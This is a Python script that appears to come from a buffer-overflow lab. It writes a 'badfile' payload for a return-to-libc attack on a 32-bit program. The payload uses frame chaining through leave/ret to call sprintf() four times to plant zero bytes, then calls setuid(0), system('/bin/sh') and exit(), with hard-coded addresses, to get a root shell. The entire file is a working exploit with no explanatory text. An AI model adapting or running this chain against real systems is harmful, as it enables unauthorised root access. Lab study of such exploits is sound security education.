#!/usr/bin/python3
import sys

def tobytes (value):
   return (value).to_bytes(4,byteorder='little')

content = bytearray(0xaa for i in range(112))

sh_addr      = 0xbffffdd0   # Address of "/bin/sh"
leaveret     = 0x08048565   # Address of leaveret
sprintf_addr = 0xb7e516d0   # Address of sprintf()
setuid_addr  = 0xb7eb9170   # Address of setuid()
system_addr  = 0xb7e42da0   # Address of system()
exit_addr    = 0xb7e369d0   # Address of exit()
ebp_foo      = 0xbfffe4c8   # foo()'s frame pointer

# Calculate the address of setuid()'s 1st argument
sprintf_arg1 = ebp_foo + 12 + 5*0x20           
# The address of a byte that contains 0x00
sprintf_arg2 = sh_addr + len("/bin/sh")        

content = bytearray(0xaa for i in range(112))

# Use leaveret to return to the first sprintf()
ebp_next  = ebp_foo + 0x20
content  += tobytes(ebp_next)
content  += tobytes(leaveret)
content  += b'A' * (0x20 - 2*4)  # Fill up the rest of the space


# sprintf(sprintf_arg1, sprintf_arg2)
for i in range(4):
  ebp_next += 0x20
  content  += tobytes(ebp_next)
  content  += tobytes(sprintf_addr)
  content  += tobytes(leaveret)
  content  += tobytes(sprintf_arg1)
  content  += tobytes(sprintf_arg2)
  content  += b'A' * (0x20 - 5*4)
  sprintf_arg1 += 1   # Set the address for the next byte

# setuid(0)
ebp_next += 0x20
content  += tobytes(ebp_next)
content  += tobytes(setuid_addr)
content  += tobytes(leaveret)
content  += tobytes(0xFFFFFFFF)  # This value will be overwritten
content  += b'A' * (0x20 - 4*4)

# system("/bin/sh")
ebp_next += 0x20
content  += tobytes(ebp_next)
content  += tobytes(system_addr)
content  += tobytes(leaveret)
content  += tobytes(sh_addr)
content  += b'A' * (0x20 - 4*4)

# exit()
content += tobytes(0xFFFFFFFF) # The value is not important
content += tobytes(exit_addr)

# Write the content to a file
with open("badfile", "wb") as f:
  f.write(content)

